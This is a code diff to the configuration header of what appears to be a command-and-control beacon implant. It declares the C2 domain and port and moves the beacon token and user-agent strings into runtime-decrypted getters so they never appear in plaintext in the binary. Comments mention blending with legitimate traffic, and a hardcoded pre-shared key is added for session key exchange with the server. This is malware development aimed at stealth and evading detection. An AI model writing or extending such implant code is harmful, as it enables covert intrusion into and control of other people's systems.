@@ -13,12 +13,19 @@ namespace config {
     extern const size_t  C2_DOMAIN_LEN;
     extern const uint16_t C2_PORT;
 
-    // Authentication token sent in X-Beacon-Token header.
-    // Must match GHOST_BEACON_TOKEN on the server.
-    extern const wchar_t* BEACON_TOKEN;
+    // Runtime-decrypted strings — never plaintext in binary.
+    // Returns pointer to internal static buffer (valid until next call).
+    const wchar_t* GetBeaconToken();
+    const wchar_t* GetUserAgent();
 
-    // User-Agent string for WinHTTP — blend with legitimate traffic
-    extern const wchar_t* USER_AGENT;
+    // Static pre-shared key for session key exchange.
+    // Must match SESSION_KEY_PSK worker secret. CHANGE BEFORE DEPLOYMENT.
+    constexpr uint8_t PSK[32] = {
+        0x3a, 0x7f, 0x11, 0xc4, 0x88, 0x2b, 0xe9, 0x14,
+        0x5d, 0x0a, 0x73, 0xf6, 0x99, 0xdc, 0x40, 0x27,
+        0x1e, 0x8c, 0x55, 0x3b, 0xa2, 0x6d, 0xf0, 0x84,
+        0xc7, 0x19, 0x4e, 0x02, 0xb8, 0x77, 0x31, 0x5f
+    };
 
     // -----------------------------------------------------------------------
     // Beacon timing
